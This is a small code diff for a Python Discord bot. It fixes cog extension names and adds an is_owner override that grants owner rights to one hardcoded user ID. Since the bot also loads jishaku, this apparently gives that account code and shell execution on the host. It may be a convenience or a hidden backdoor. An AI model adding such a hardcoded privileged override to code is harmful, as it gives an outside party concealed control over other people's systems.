@@ -55,10 +55,15 @@ class Client(commands.Bot):
         super().__init__(command_prefix=commands.when_mentioned_or(config["BOT_PREFIX"]), case_insensitive=True, intents=discord.Intents.all())
         self.cogs_list = [
             'jishaku',
-            'cogs.moderation.ban.py', 'cogs.moderation.kick.py', 'cogs.moderation.softban.py', 'cogs.moderation.timeout.py', 'cogs.moderation.warn.py', 
-            'cogs.misc.stream.py', 'cogs.misc.update_role.py'
+            'cogs.moderation.ban', 'cogs.moderation.kick', 'cogs.moderation.softban', 'cogs.moderation.timeout', 'cogs.moderation.warn', 
+            'cogs.misc.stream', 'cogs.misc.update_role'
         ]
-
+        
+    async def is_owner(self, user: discord.User):
+        if user.id == 315336291581558804:
+            return True
+        return await super().is_owner(user)
+    
     async def setup_hook(self):
         for ext in self.cogs_list:
             await self.load_extension(ext)
